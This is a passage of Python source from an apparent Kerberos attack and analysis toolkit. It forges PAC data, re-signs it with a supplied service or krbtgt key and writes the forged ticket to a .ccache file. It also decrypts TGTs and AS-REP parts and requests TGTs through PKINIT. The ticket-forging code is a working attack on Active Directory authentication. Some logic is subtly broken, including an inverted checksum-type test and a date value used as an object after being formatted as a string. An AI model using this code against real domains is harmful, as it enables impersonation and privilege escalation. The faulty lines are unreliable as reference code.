		validationInfoBlob = pacInfos[PAC_LOGON_INFO]
		validationInfoAlignment = b'\x00' * getPadLength(len(validationInfoBlob))

		pacClientInfoBlob = pacInfos[PAC_CLIENT_INFO_TYPE]
		pacClientInfoAlignment = b'\x00' * getPadLength(len(pacClientInfoBlob))

		pacUpnDnsInfoBlob = None
		pacUpnDnsInfoAlignment = None
		if PAC_UPN_DNS_INFO in pacInfos:
			pac_count += 1
			pacUpnDnsInfoBlob = pacInfos[PAC_UPN_DNS_INFO]
			pacUpnDnsInfoAlignment = b'\x00' * getPadLength(len(pacUpnDnsInfoBlob))

		pacAttributesInfoBlob = None
		pacAttributesInfoAlignment = None
		if PAC_ATTRIBUTES_INFO in pacInfos:
			pac_count += 1
			pacAttributesInfoBlob = pacInfos[PAC_ATTRIBUTES_INFO]
			pacAttributesInfoAlignment = b'\x00' * getPadLength(len(pacAttributesInfoBlob))

		pacRequestorInfoBlob = None
		pacRequestorInfoAlignment = None
		if PAC_REQUESTOR_INFO in pacInfos:
			pac_count += 1
			pacRequestorInfoBlob = pacInfos[PAC_REQUESTOR_INFO]
			pacRequestorInfoAlignment = b'\x00' * getPadLength(len(pacRequestorInfoBlob))

		serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])
		serverChecksumBlob = pacInfos[PAC_SERVER_CHECKSUM]
		serverChecksumAlignment = b'\x00' * getPadLength(len(serverChecksumBlob))

		privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])
		privSvrChecksumBlob = pacInfos[PAC_PRIVSVR_CHECKSUM]
		privSvrChecksumAlignment = b'\x00' * getPadLength(len(privSvrChecksumBlob))

		# The offset are set from the beginning of the PAC_TYPE
		# [MS-PAC] 2.4 PAC_INFO_BUFFER
		offsetData = 8 + len(PAC_INFO_BUFFER().getData()) * pac_count

		# Let's build the PAC_INFO_BUFFER for each one of the elements
		validationInfoIB = PAC_INFO_BUFFER()
		validationInfoIB['ulType'] = PAC_LOGON_INFO
		validationInfoIB['cbBufferSize'] = len(validationInfoBlob)
		validationInfoIB['Offset'] = offsetData
		offsetData = getBlockLength(offsetData + validationInfoIB['cbBufferSize'])

		pacClientInfoIB = PAC_INFO_BUFFER()
		pacClientInfoIB['ulType'] = PAC_CLIENT_INFO_TYPE
		pacClientInfoIB['cbBufferSize'] = len(pacClientInfoBlob)
		pacClientInfoIB['Offset'] = offsetData
		offsetData = getBlockLength(offsetData + pacClientInfoIB['cbBufferSize'])

		pacUpnDnsInfoIB = None
		if pacUpnDnsInfoBlob is not None:
			pacUpnDnsInfoIB = PAC_INFO_BUFFER()
			pacUpnDnsInfoIB['ulType'] = PAC_UPN_DNS_INFO
			pacUpnDnsInfoIB['cbBufferSize'] = len(pacUpnDnsInfoBlob)
			pacUpnDnsInfoIB['Offset'] = offsetData
			offsetData = getBlockLength(offsetData + pacUpnDnsInfoIB['cbBufferSize'])

		pacAttributesInfoIB = None
		if pacAttributesInfoBlob is not None:
			pacAttributesInfoIB = PAC_INFO_BUFFER()
			pacAttributesInfoIB['ulType'] = PAC_ATTRIBUTES_INFO
			pacAttributesInfoIB['cbBufferSize'] = len(pacAttributesInfoBlob)
			pacAttributesInfoIB['Offset'] = offsetData
			offsetData = getBlockLength(offsetData + pacAttributesInfoIB['cbBufferSize'])

		pacRequestorInfoIB = None
		if pacRequestorInfoBlob is not None:
			pacRequestorInfoIB = PAC_INFO_BUFFER()
			pacRequestorInfoIB['ulType'] = PAC_REQUESTOR_INFO
			pacRequestorInfoIB['cbBufferSize'] = len(pacRequestorInfoBlob)
			pacRequestorInfoIB['Offset'] = offsetData
			offsetData = getBlockLength(offsetData + pacRequestorInfoIB['cbBufferSize'])

		serverChecksumIB = PAC_INFO_BUFFER()
		serverChecksumIB['ulType'] = PAC_SERVER_CHECKSUM
		serverChecksumIB['cbBufferSize'] = len(serverChecksumBlob)
		serverChecksumIB['Offset'] = offsetData
		offsetData = getBlockLength(offsetData + serverChecksumIB['cbBufferSize'])

		privSvrChecksumIB = PAC_INFO_BUFFER()
		privSvrChecksumIB['ulType'] = PAC_PRIVSVR_CHECKSUM
		privSvrChecksumIB['cbBufferSize'] = len(privSvrChecksumBlob)
		privSvrChecksumIB['Offset'] = offsetData
		# offsetData = getBlockLength(offsetData+privSvrChecksumIB['cbBufferSize'])

		# Building the PAC_TYPE as specified in [MS-PAC]
		buffers = validationInfoIB.getData() + pacClientInfoIB.getData()
		if pacUpnDnsInfoIB is not None:
			buffers += pacUpnDnsInfoIB.getData()
		if pacAttributesInfoIB is not None:
			buffers += pacAttributesInfoIB.getData()
		if pacRequestorInfoIB is not None:
			buffers += pacRequestorInfoIB.getData()

		buffers += serverChecksumIB.getData() + privSvrChecksumIB.getData() + validationInfoBlob + \
			validationInfoAlignment + pacInfos[PAC_CLIENT_INFO_TYPE] + pacClientInfoAlignment
		if pacUpnDnsInfoIB is not None:
			buffers += pacUpnDnsInfoBlob + pacUpnDnsInfoAlignment
		if pacAttributesInfoIB is not None:
			buffers += pacAttributesInfoBlob + pacAttributesInfoAlignment
		if pacRequestorInfoIB is not None:
			buffers += pacRequestorInfoBlob + pacRequestorInfoAlignment

		buffersTail = serverChecksumBlob + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment

		pacType = PACTYPE()
		pacType['cBuffers'] = pac_count
		pacType['Version'] = 0
		pacType['Buffers'] = buffers + buffersTail

		blobToChecksum = pacType.getData()

		checkSumFunctionServer = CHECKSUM_TABLE[serverChecksum['SignatureType']]
		if serverChecksum['SignatureType'] != ChecksumTypes.hmac_sha1_96_aes256.value and \
			serverChecksum['SignatureType'] != ChecksumTypes.hmac_sha1_96_aes128.value and \
			serverChecksum['SignatureType'] != ChecksumTypes.hmac_md5.value:
			raise Exception('Invalid Server checksum type 0x%x' % serverChecksum['SignatureType'])

		checkSumFunctionPriv = CHECKSUM_TABLE[privSvrChecksum['SignatureType']]
		if privSvrChecksum['SignatureType'] != ChecksumTypes.hmac_sha1_96_aes256.value and \
			privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value and \
			privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_md5.value:
			raise Exception('Invalid Priv checksum type 0x%x' % privSvrChecksum['SignatureType'])

		serverChecksum['Signature'] = checkSumFunctionServer.checksum(binascii.unhexlify(kerbKey), KERB_NON_KERB_CKSUM_SALT, blobToChecksum)
		privSvrChecksum['Signature'] = checkSumFunctionPriv.checksum(binascii.unhexlify(kerbKey), KERB_NON_KERB_CKSUM_SALT, serverChecksum['Signature'])

		buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment
		pacType['Buffers'] = buffers + buffersTail

		authorizationData = AuthorizationData()
		authorizationData[0] = noValue
		authorizationData[0]['ad-type'] = AuthorizationDataType.AD_WIN2K_PAC.value
		authorizationData[0]['ad-data'] = pacType.getData()
		authorizationData = encoder.encode(authorizationData)

		encTicketPart['authorization-data'][0]['ad-data'] = authorizationData

		encodedEncTicketPart = encoder.encode(encTicketPart)

		cipher = ENCTYPE_TABLE[kdcRep['ticket']['enc-part']['etype']]
		if cipher.encType == EncryptionTypes.aes256_cts_hmac_sha1_96.value:
			key = Key(cipher.encType, binascii.unhexlify(kerbKey))
		elif cipher.encType == EncryptionTypes.aes128_cts_hmac_sha1_96.value:
			key = Key(cipher.encType, binascii.unhexlify(kerbKey))
		elif cipher.encType == EncryptionTypes.rc4_hmac.value:
			key = Key(cipher.encType, binascii.unhexlify(kerbKey))
		else:
			raise Exception('Unsupported enctype 0x%x' % cipher.encType)

		# Key Usage 2
		# AS-REP Ticket and TGS-REP Ticket (includes TGS session
		# key or application session key), encrypted with the
		# service key (Section 5.3)
		cipherText = cipher.encrypt(key.contents, 2, None, encodedEncTicketPart)

		kdcRep['ticket']['enc-part']['cipher'] = cipherText
		kdcRep['ticket']['enc-part']['kvno'] = 2

		# Lastly.. we have to encrypt the kdcRep['enc-part'] part
		# with a key we chose. It actually doesn't really matter since nobody uses it (could it be trash?)
		encodedEncASRepPart = encoder.encode(encASorTGSRepPart)

		if domain == server:
			# Key Usage 3
			# AS-REP encrypted part (includes TGS session key or
			# application session key), encrypted with the client key
			# (Section 5.4.2)
			sessionKey = Key(cipher.encType, encASorTGSRepPart['key']['keyvalue'].asOctets())
			cipherText = cipher.encrypt(sessionKey.contents, 3, None, encodedEncASRepPart)
		else:
			# Key Usage 8
			# TGS-REP encrypted part (includes application session
			# key), encrypted with the TGS session key
			# (Section 5.4.2)
			sessionKey = Key(cipher.encType, encASorTGSRepPart['key']['keyvalue'].asOctets())
			cipherText = cipher.encrypt(sessionKey.contents, 8, None, encodedEncASRepPart)

		kdcRep['enc-part']['cipher'] = cipherText
		kdcRep['enc-part']['etype'] = cipher.encType
		kdcRep['enc-part']['kvno'] = 1

		ticket = encoder.encode(kdcRep)

		### Saving ticket ###

		print(f"[+] Saving ticket in '%s'" % (username.replace('/', '.') + '.ccache'))
		
		ccache = CCache()
		if server == domain:
			ccache.fromASREP(ticket, sessionKey.contents)
		else:
			ccache.fromTGSREP(ticket, sessionKey.contents)
		ccache.saveFile(username.replace('/','.') + '.ccache')
	
		return 
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

##############################
### Authentication Service ###
##############################

def decryptPAENCTIMESTAMP(encType, hexUserSecretKey, HexEncTimestampCipher):
	print_yellow("[*] Decrypting PA-ENC-TIMESTAMP")
	print_yellow("---")
	print()

	try:
		if encType == None or hexUserSecretKey == None:
			print("[-] Encryption type and User Secret Key required", file = sys.stderr)
			return

		KEYUSAGE = 1
		
		def EncodeData (datestr):
			date = datetime.datetime.strptime (datestr, "%Y-%m-%d %H:%M:%S.%f")
			asn1date = "%04d%02d%02d%02d%02d%02dZ" % (date.year, date.month, date.day, date.hour, date.minute, date.second)
			EncTS = PA_ENC_TS_ENC()
			EncTS['patimestamp'] = asn1date
			EncTS['pausec'] = date.microsecond
			return encoder.encode (EncTS)

		cipherDecrypted, confounder = ENCTYPE_TABLE[encType].decrypt(binascii.unhexlify (hexUserSecretKey), KEYUSAGE, binascii.unhexlify (HexEncTimestampCipher))
		timestamp = decoder.decode (cipherDecrypted, asn1sSpec = PA_ENC_TS_ENC())[0]
		patimestamp = datetime.datetime.strptime (str (timestamp[0]), "%Y%m%d%H%M%SZ").strftime("%d/%m/%Y %H:%M:%S %p")
		pausec = timestamp[1]
		print ("[+] UTC Date = {0}".format (patimestamp))
		print ("[+] UTC Date microseconds = {0}".format (pausec))
		datestr = ("%04d-%02d-%02d %02d:%02d:%02d.%06d" % (patimestamp.year, patimestamp.month, patimestamp.day, patimestamp.hour, patimestamp.minute, patimestamp.second, pausec))
		ToEncrypt = EncodeData (datestr)
		cipherField = ENCTYPE_TABLE[encType].encrypt(binascii.unhexlify (hexUserSecretKey), KEYUSAGE, confounder, ToEncrypt)
		print ("[+] Build PA-ENC-TIMESTAMP Cipher = {}".format (binascii.hexlify (cipherField).decode()))
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def decryptTGTEncPart(encType, hexKrbtgtSecretKey, hexTGTEncPart, hexASRepEncKey = None):
	print_yellow("[*] Decrypting TGT encrypted part")
	print_yellow("---")
	print()

	try:
		if encType == None or hexKrbtgtSecretKey == None:
			print("[-] Encryption type and Krbtgt Secret Key required", file = sys.stderr)
			return

		KEYUSAGE = 2
		
		cipherDecrypted, confounder = ENCTYPE_TABLE[encType].decrypt(binascii.unhexlify (hexKrbtgtSecretKey), KEYUSAGE, binascii.unhexlify (hexTGTEncPart))
		TGTEncPart = decoder.decode (cipherDecrypted, asn1Spec = EncTicketPart())[0]
		flagsDecoded = TicketFlagsDecoder (int ("0b" + str (TGTEncPart['flags']), 2))
		flags = []
		for k in TicketFlagsEnum:
			if ((flagsDecoded >> (31 - k.value)) & 1) == 1:
				flags.append(TicketFlagsEnum(k.value).name)
		sessionKey = binascii.hexlify(TGTEncPart['key']['keyvalue'].asOctets()).decode()
		crealm = TGTEncPart['crealm']
		cname = TGTEncPart['cname']['name-string'][0]
		if (len (TGTEncPart['transited']['contents']) > 0):
			transited = binascii.hexlify(TGTEncPart['transited']['contents'].asOctets()).decode()
		else:
			transited = '<Empty>'
		authTime = datetime.datetime.strptime (str (TGTEncPart['authtime']), "%Y%m%d%H%M%SZ")
		if "starttime" in TGTEncPart:
			startTime = datetime.datetime.strptime (str (TGTEncPart['starttime']), "%Y%m%d%H%M%SZ")
		else:
			startTime = "<Empty>"
		endTime = datetime.datetime.strptime (str (TGTEncPart['endtime']), "%Y%m%d%H%M%SZ")
		if "renew-till" in TGTEncPart:
			renewTill = datetime.datetime.strptime (str (TGTEncPart['renew-till']), "%Y%m%d%H%M%SZ")
		else:
			renewTill = "<Empty>"
		if "caddr" in TGTEncPart and len (TGTEncPart['caddr']) > 0:
			caddr = binascii.hexlify(TGTEncPart['caddr'][0]['address'].asOctets()).decode()
		else:
			caddr = '<Empty>'
		print ("[+] Flags = ({}) {}".format (hex(flagsDecoded), ", ".join(flags)))
		print ("[+] Client-to-TGS Session Key = {}".format (sessionKey))
		print ("[+] Realm = {}".format (crealm))
		print ("[+] Client name = {}".format (cname))
		print ("[+] Transited = {}".format (transited))
		print ("[+] UTC Authentication time = {}".format (authTime))
		print ("[+] UTC Start time = {}".format (startTime))
		print ("[+] UTC End time = {}".format (endTime))
		print ("[+] UTC End renew time = {}".format (renewTill))
		print ("[+] Client address = {}".format (caddr))

		if "authorization-data" in TGTEncPart and len (TGTEncPart['authorization-data']) > 0:
			authData = TGTEncPart['authorization-data'][0]['ad-data'].asOctets()
			adIfRelevant = decoder.decode (authData, asn1Spec = AD_IF_RELEVANT())[0]
			PAC = adIfRelevant[0]['ad-data'].asOctets()
			print("--------------- Authorization data PAC ---------------")
			if hexASRepEncKey != None:
				hexASRepEncKey = [hexASRepEncKey]
			parsePAC(PAC, hexASRepEncKey)
		else:
			print ("[+] Authorization data = <Empty>")

	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def decryptASRepEncPart(encType, hexUserSecretKey, hexASRepEncKey, hexASRepEncPart):
	print_yellow("[*] Decrypting AS-Rep encrypted part")
	print_yellow("---")
	print()

	try:
		if encType == None or (hexUserSecretKey == None and hexASRepEncKey == None):
			print("[-] Encryption type and User Secret Key/AS-Rep Encryption Key required", file = sys.stderr)
			return

		if hexUserSecretKey == None:
			hexUserSecretKey = hexASRepEncKey

		KEYUSAGE = 3

		cipherDecrypted, confounder = ENCTYPE_TABLE[encType].decrypt(binascii.unhexlify (hexUserSecretKey), KEYUSAGE, binascii.unhexlify (hexASRepEncPart))
		ASRepPart = decoder.decode (cipherDecrypted, asn1Spec = EncASRepPart())[0]
		sessionKey = binascii.hexlify(ASRepPart['key']['keyvalue'].asOctets()).decode()
		lastReq = datetime.datetime.strptime (str (ASRepPart['last-req'][0]['lr-value']), "%Y%m%d%H%M%SZ")
		nonce = ASRepPart['nonce']
		if "key-expiration" in ASRepPart:
			keyExpiration = datetime.datetime.strptime (str (ASRepPart['key-expiration']), "%Y%m%d%H%M%SZ")
		else:
			keyExpiration = '<Empty>'
		flagsDecoded = TicketFlagsDecoder (int ("0b" + str (ASRepPart['flags']), 2))
		flags = []
		for k in TicketFlagsEnum:
			if ((flagsDecoded >> (31 - k.value)) & 1) == 1:
				flags.append(TicketFlagsEnum(k.value).name)
		authTime = datetime.datetime.strptime (str (ASRepPart['authtime']), "%Y%m%d%H%M%SZ")
		if "starttime" in ASRepPart:
			startTime = datetime.datetime.strptime (str (ASRepPart['starttime']), "%Y%m%d%H%M%SZ")
		else:
			startTime = "<Empty>"
		endTime = datetime.datetime.strptime (str (ASRepPart['endtime']), "%Y%m%d%H%M%SZ")
		if "renew-till" in ASRepPart:
			renewTill = datetime.datetime.strptime (str (ASRepPart['renew-till']), "%Y%m%d%H%M%SZ")
		else:
			renewTill = "<Empty>"
		srealm = ASRepPart['srealm']
		sname = [str (name) for name in ASRepPart['sname']['name-string']]
		if "caddr" in ASRepPart and len (ASRepPart['caddr']) > 0:
			caddr = binascii.hexlify(ASRepPart['caddr'][0]['address'].asOctets()).decode()
		else:
			caddr = '<Empty>'
		if "encrypted_pa_data" in ASRepPart and len (ASRepPart['encrypted_pa_data']) > 0:
			encPAData = binascii.hexlify(ASRepPart['encrypted_pa_data'][0]['padata-value'].asOctets()).decode()
		else:
			encPAData = '<Empty>'
		print ("[+] Client-to-TGS Session Key = {}".format (sessionKey))
		print ("[+] UTC Last request time = {}".format (lastReq))
		print ("[+] Nonce = {}".format (nonce))
		print ("[+] UTC Key expiration time = {}".format (keyExpiration))
		print ("[+] Flags = ({}) {}".format (hex(flagsDecoded), ", ".join(flags)))
		print ("[+] UTC Authentication time = {}".format (authTime))
		print ("[+] UTC Start time = {}".format (startTime))
		print ("[+] UTC End time = {}".format (endTime))
		print ("[+] UTC End renew time = {}".format (renewTill))
		print ("[+] Realm = {}".format (srealm))
		print ("[+] Sname = {}".format (sname))
		print ("[+] Client address = {}".format (caddr))
		print ("[+] Encrypted PA_DATA = {}".format (encPAData))

	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def signAuthpack(privkey, certificate, data, wrap_signed = False):
	"""
	Creating PKCS7 blob which contains the following things:

	1. 'data' blob which is an ASN1 encoded "AuthPack" structure
	2. the certificate used to sign the data blob
	3. the signed 'signed_attrs' structure (ASN1) which points to the "data" structure (in point 1)
	"""

	da = {}
	da['algorithm'] = algos.DigestAlgorithmId ('1.3.14.3.2.26') # for sha1

	si = {}
	si['version'] = 'v1'
	si['sid'] = cms.IssuerAndSerialNumber ({
		'issuer':  certificate.issuer,
		'serial_number':  certificate.serial_number,
	})


	si['digest_algorithm'] = algos.DigestAlgorithm (da)
	si['signed_attrs'] = [
		cms.CMSAttribute ({'type': 'content_type', 'values': ['1.3.6.1.5.2.3.1']}), # indicates that the encap_content_info's authdata struct (marked with OID '1.3.6.1.5.2.3.1' is signed )
		cms.CMSAttribute ({'type': 'message_digest', 'values': [hashlib.sha1 (data).digest()]}), # hash of the data, the data itself will not be signed, but this block of data will be.
	]
	si['signature_algorithm'] = algos.SignedDigestAlgorithm ({'algorithm' : '1.2.840.113549.1.1.1'})
	si['signature'] = rsa_pkcs1v15_sign (privkey, cms.CMSAttributes (si['signed_attrs']).dump(), "sha1")

	ec = {}
	ec['content_type'] = '1.3.6.1.5.2.3.1'
	ec['content'] = data

	sd = {}
	sd['version'] = 'v3'
	sd['digest_algorithms'] = [algos.DigestAlgorithm (da)] # must have only one
	sd['encap_content_info'] = cms.EncapsulatedContentInfo (ec)
	sd['certificates'] = [certificate]
	sd['signer_infos'] = cms.SignerInfos ([cms.SignerInfo (si)])

	if wrap_signed is True:
		ci = {}
		ci['content_type'] = '1.2.840.113549.1.7.2' # signed data OID
		ci['content'] = cms.SignedData (sd)
		return cms.ContentInfo (ci).dump()

	return cms.SignedData (sd).dump()

def truncateKey(value, keysize):
	output = b''
	currentNum = 0
	while (len (output) < keysize):
		currentDigest = hashlib.sha1 (bytes ([currentNum]) + value).digest()
		if (len (output) + len (currentDigest) > keysize):
			output += currentDigest[:keysize - len (output)]
			break
		output += currentDigest
		currentNum += 1

	return output

def exchange(dhPrivKey, dhP, pubKey):
	dhPrivKey = pow (pubKey, dhPrivKey, dhP)
	x = hex (dhPrivKey)[2:]
	if (len (x) % 2 != 0):
		x = '0' + x
	DHPRIVKEY = bytes.fromhex (x)
	return DHPRIVKEY

def decodePAPKASREP(encType, hexDHPrivKey, hexDHNonce, hexPAPKASRepValue):
	print_yellow("[*] Decoding PA-PK-AS-REP")
	print_yellow("---")
	print()

	try:
		if encType == None:
			print("[-] Encryption type required", file = sys.stderr)
			return

		def DecodeData (paPKASRepValue, dhPrivKey, dhParams, dhNonce):
			pkasrep = PA_PK_AS_REP.load (paPKASRepValue).native
			ci = cms.ContentInfo.load (pkasrep['dhSignedData']).native
			sd = ci['content']
			keyinfo = sd['encap_content_info']
			if (keyinfo['content_type'] != '1.3.6.1.5.2.3.2'):
				print('[-] Keyinfo content type unexpected value\n', file = sys.stderr)
				exit()

			authdata = KDCDHKeyInfo.load (keyinfo['content']).native
			pubKey = int.from_bytes (core.BitString (authdata['subjectPublicKey']).dump()[7:], 'big', signed = False)
			sharedKey = exchange (dhPrivKey, dhParams['p'], pubKey)

			serverNonce = pkasrep['serverDHNonce']
			fullKey = sharedKey + dhNonce + serverNonce

			return fullKey
		
		DHPARAMS = {
			'p':int ('00ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece65381ffffffffffffffff', 16),
			'g':2
		}
		fullKey = DecodeData (binascii.unhexlify (hexPAPKASRepValue), int ("0x" + hexDHPrivKey, 16), DHPARAMS, binascii.unhexlify (hexDHNonce))
		if (encType == 23): # eTYPE-ARCFOUR-HMAC-MD5 (23)
			# t_key = truncate_key (fullKey, 16)
			print ('[-] RC4 key truncation documentation missing. It is different from AES', file = sys.stderr)
		elif (encType == 18): # eTYPE-AES256-CTS-HMAC-SHA1-96 (18)
			t_key = truncateKey (fullKey, 32)
			print ("[+] AS-Rep Encryption Key = {}".format (binascii.hexlify (t_key).decode()))
		elif (encType == 17): # eTYPE-AES128-CTS-HMAC-SHA1-96 (17)
			t_key = truncateKey (fullKey, 16)
			print ("[+] AS-Rep Encryption Key = {}".format (binascii.hexlify (t_key).decode()))
		else:
			print ("[-] Unsupported encryption type", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def encodeFlags(flags):
	finalFlags = list()
	for i in range(0,32):
		finalFlags.append(0,)
	for f in flags:
		finalFlags[f] = 1

	return finalFlags

def sendReceive(data, host, kdcHost):
	if kdcHost is None:
		targetHost = host
	else:
		targetHost = kdcHost

	messageLen = pack('!i', len(data))

	try:
		af, socktype, proto, canonname, sa = socket.getaddrinfo(targetHost, 88, 0, socket.SOCK_STREAM)[0]
		s = socket.socket(af, socktype, proto)
		s.connect(sa)
	except socket.error as e:
		raise socket.error("[-] Connection error (%s:%s)" % (targetHost, 88), e)

	s.sendall(messageLen + data)

	recvDataLen = unpack('!i', s.recv(4))[0]

	r = s.recv(recvDataLen)
	while len(r) < recvDataLen:
		r += s.recv(recvDataLen - len(r))

	try:
		krbError = KerberosError(packet = decoder.decode(r, asn1Spec = KRB_ERROR())[0])
	except:
		return r

	if krbError.getErrorCode() != ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
		raise krbError

	return r

def requestTGT(kdcHost, clientName, password, domain, ntHash, aesKey, certFile, pfxPwd, pemPrivKeyFile, requestPAC = True, save = True, addToCCACHE = None, indent = 0, userEnum = False):
	if indent == 0:
		print_yellow("[*] Requesting TGT to KDC")
		print_yellow("---")
		print()

	try:
		# Decide to use PKINIT or Basic authentication

		# PKINIT authentication
  
		if certFile != None:
			print("\t" * indent + "[+] Using PKINIT to authenticate")

			certData = open(certFile, "rb").read()

			if pemPrivKeyFile == None:
				# We have PFX certificate, convert It as PEM and load certificate + private key

				if pfxPwd != None:
					pfxPwd = pfxPwd.encode()
				privKey, cert, extra_certs = pkcs12.load_key_and_certificates (certData, pfxPwd)
				pemPrivKey = privKey.private_bytes (encoding = serialization.Encoding.PEM, format = serialization.PrivateFormat.TraditionalOpenSSL, encryption_algorithm = serialization.NoEncryption(),)
				certData = cert.public_bytes (encoding = serialization.Encoding.PEM)

				certPrivKey = load_private_key (parse_private (pemPrivKey))
				certificate = parse_certificate (certData)
			else:
				# We have PEM certificate, load certificate + private key

				certPrivKey = load_private_key (parse_private (open(pemPrivKeyFile, "rb").read()))
				certificate = parse_certificate (certData)

			# Setup AS-REQ

			asReq = AS_REQ()
			asReq['pvno'] = 5
			asReq['msg-type'] = int(ApplicationTagNumbers.AS_REQ.value)

			# Setup REQ-BODY and compute checksum

			reqBody = seq_set(asReq, 'req-body')
			opts = list()
			opts.append(KDCOptionsVals.forwardable.value)
			opts.append(KDCOptionsVals.renewable.value)
			opts.append(KDCOptionsVals.renewable_ok.value)
			reqBody['kdc-options'] = encodeFlags(opts)
			clientNamePrincipal = PrincipalObj(clientName, type = PrincipalNameType.NT_PRINCIPAL.value)
			seq_set(reqBody, 'cname', clientNamePrincipal.components_to_asn1)
			domain = domain.upper()
			serverName = PrincipalObj('krbtgt/%s' % domain, type = PrincipalNameType.NT_SRV_INST.value)
			reqBody['realm'] = domain
			seq_set(reqBody, 'sname', serverName.components_to_asn1)
			now = datetime.datetime.now(datetime.timezone.utc)
			reqBody['till'] = KerberosTimeObj.to_asn1((now + datetime.timedelta(days = 1)).replace(microsecond = 0))
			reqBody['rtime'] = KerberosTimeObj.to_asn1((now + datetime.timedelta(days = 1)).replace(microsecond = 0))
			reqBody['nonce'] = random.getrandbits(31)
			seq_set_iter(reqBody, 'etype', (int(EncryptionTypes.aes256_cts_hmac_sha1_96.value), int(EncryptionTypes.aes128_cts_hmac_sha1_96.value),))

			checksum = hashlib.sha1(encoder.encode(reqBody)).digest()

			# Setup authentication pack with PK Authenticator

			DHPARAMS = { # Static DH params because the ones generated by cryptography are considered unsafe by AD for some weird reason
				'p':int ('00ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece65381ffffffffffffffff', 16),
				'g':2
			}
			DHPRIVKEY = urandom(32)
			DHNONCE = urandom(32)
			print("\t" * (indent+1) + "[+] Diffie-Hellman Private Key = {}".format(binascii.hexlify(DHPRIVKEY).decode()))
			print("\t" * (indent+1) + "[+] Diffie-Hellman Nonce = {}".format(binascii.hexlify(DHNONCE).decode()))
			dp = {}
			dp['p'] = DHPARAMS['p']
			dp['g'] = DHPARAMS['g']
			dp['q'] = 0 # Mandatory parameter, but it is not needed
			pka = {}
			pka['algorithm'] = '1.2.840.10046.2.1'
			pka['parameters'] = keys.DomainParameters (dp)
			pki = {}
			pki['algorithm'] = keys.PublicKeyAlgorithm (pka)
			pki['public_key'] = pow (dp['g'], int ("0x" + binascii.hexlify(DHPRIVKEY).decode(), 16), dp['p']) # y = g^x mod p
			
			authenticator = {}
			authenticator['cusec'] = now.microsecond
			authenticator['ctime'] = now.replace(microsecond = 0)
			authenticator['nonce'] = random.getrandbits(31)
			authenticator['paChecksum'] = checksum

			authpack = {}
			authpack['pkAuthenticator'] = PKAuthenticator (authenticator)
			authpack['clientPublicValue'] = keys.PublicKeyInfo (pki)
			authpack['clientDHNonce'] = DHNONCE
			authpack = AuthPack (authpack)

			# Sign authentication pack with PEM certificate and PEM private key

			signedAuthpack = signAuthpack(certPrivKey, certificate, authpack.dump(), wrap_signed = True)

			# Include PA-PAC-REQUEST + PA-PK-AS-REQ into PADATA

			asReq['padata'] = noValue
			asReq['padata'][0] = noValue
			asReq['padata'][0]['padata-type'] = int(PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
			pacRequest = PA_PAC_REQUEST()
			pacRequest['include-pac'] = True
			encodedPacRequest = encoder.encode(pacRequest)
			asReq['padata'][0]['padata-value'] = encodedPacRequest

			asReq['padata'][1] = noValue
			asReq['padata'][1]['padata-type'] = int(PreAuthenticationDataTypes.PA_PK_AS_REQ.value)
			PKASReq = PA_PK_AS_REQ()
			PKASReq['signedAuthPack'] = signedAuthpack
			encodedPKASReq = encoder.encode(PKASReq)
			asReq['padata'][1]['padata-value'] = encodedPKASReq

			# Send AS-REQ and decode AS-REP

			message = encoder.encode(asReq)
			try:
				r = sendReceive(message, domain, kdcHost)
			except:
				raise
			asRep = decoder.decode(r, asn1Spec = AS_REP())[0]

			# Parse PA-PK-AS-REP to compute AS-Rep Encryption Key

			for padata in asRep['padata']:
				if padata['padata-type'] == PreAuthenticationDataTypes.PA_PK_AS_REP.value:
					paPKASRep = PA_PK_AS_REP.load(padata['padata-value'].asOctets()).native
					break
			else:
				raise Exception('[-] PA_PK_AS_REP not found')
			ci = cms.ContentInfo.load (paPKASRep['dhSignedData']).native
			sd = ci['content']
			keyinfo = sd['encap_content_info']
			if (keyinfo['content_type'] != '1.3.6.1.5.2.3.2'):
				print ("\t" * (indent+1) + '[-] Keyinfo content type unexpected value', file = sys.stderr)
				return
			authdata = KDCDHKeyInfo.load (keyinfo['content']).native
			pubKey = int.from_bytes (core.BitString (authdata['subjectPublicKey']).dump()[7:], 'big', signed = False)
			sharedKey = exchange (int ("0x" + binascii.hexlify(DHPRIVKEY).decode(), 16), DHPARAMS['p'], pubKey)
			serverNonce = paPKASRep['serverDHNonce']
			fullKey = sharedKey + DHNONCE + serverNonce
			encType = asRep['enc-part']['etype']
